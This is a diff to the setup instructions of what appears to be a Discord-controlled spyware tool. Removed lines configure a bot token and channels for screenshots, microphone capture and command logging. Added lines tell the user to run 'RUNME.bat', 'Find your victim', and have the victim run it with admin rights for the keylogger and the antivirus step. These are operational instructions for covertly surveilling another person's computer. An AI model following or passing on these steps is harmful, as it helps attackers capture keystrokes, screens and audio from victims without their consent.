@@ -7,15 +7,6 @@
 
 # Instructions
 1. Create discord bot.
-2. Create .env.
-3. Inside .env write: 
-- TOKEN="DISCORD BOT TOKEN HERE"
-
-4. Inside src\main_sender.py insert ids (line: 13): 
-- guild = "SERVER ID"
-- screenshot_channel = "SCREENSHOT CHANNEL ID"
-- microphone_channel = "MICROPHONE CHANNEL ID"
-- logger_channel = "COMMANDS CHANNEL ID"
-- connect_channel = "CONNECTION MESSAGE CHANNEL ID"
-
-5. Find your victim.
+2. Run "RUNME.bat" UNLESS ".caller" doesn't exist.
+3. Find your victim.
+4. Make sure they run this with admin rights for the keylogger and antivirus.
